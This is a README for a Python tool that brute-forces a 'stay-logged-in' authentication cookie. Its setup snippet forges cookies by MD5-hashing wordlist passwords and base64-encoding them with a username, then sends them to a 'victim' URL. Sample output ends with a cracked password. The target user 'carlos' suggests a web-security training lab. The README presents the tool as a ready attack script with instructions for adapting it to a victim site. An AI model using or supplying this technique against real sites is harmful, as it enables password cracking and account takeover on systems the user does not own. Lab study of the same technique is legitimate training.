# stay-logged-in-cookie-brute-force

The script is designed for brute-forcing the password associated with a given username that uses a stay logged-in cookie which allows you to bypass the entire login process. It utilises a wordlist of potential passwords, creates corresponding cookies using MD5 hashing and base64 encoding it, and sends HTTP requests to check for successful authentication. The script employs multi-threading to speed up the password-checking process and terminates upon finding the correct password.

## Setup

You'll need to have Python 3 installed on your machine to run the script.

You must update the global variable `url` with the victim's URL, and adapt the `Cookie` session and `headers` to your case.

```bash
url = "https://victim.site/my-account?id=carlos"
encoded_cookie = base64.b64encode(f"{username}:{hashed_password}".encode()).decode()
headers = {
    "Cookie": f"stay-logged-in={cookie}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    # Add other headers if necessary
}
```

## Output Example

```python
Authentication failed with password: dragon
Authentication failed with password: 1234
Authentication failed with password: 12345678
Authentication failed with password: 1234567
...
Authentication failed with password: password
...
Successfully authenticated with password: football
Exiting program. Valid password found: football
```
